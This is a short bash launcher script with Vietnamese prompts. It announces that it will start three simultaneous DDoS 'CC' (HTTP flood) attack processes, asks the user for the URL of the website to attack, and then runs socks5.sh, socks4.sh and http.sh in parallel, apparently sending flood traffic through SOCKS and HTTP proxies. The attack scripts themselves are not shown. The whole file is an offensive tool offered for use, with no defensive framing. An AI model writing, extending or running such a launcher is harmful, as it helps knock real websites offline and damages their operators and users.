#!/bin/bash -x
echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
echo Nhap URL trang web can tan cong:
read URL
read -p "Press any key to continue . . ."
./socks5.sh 1 &
./socks4.sh 2 &
./http.sh 3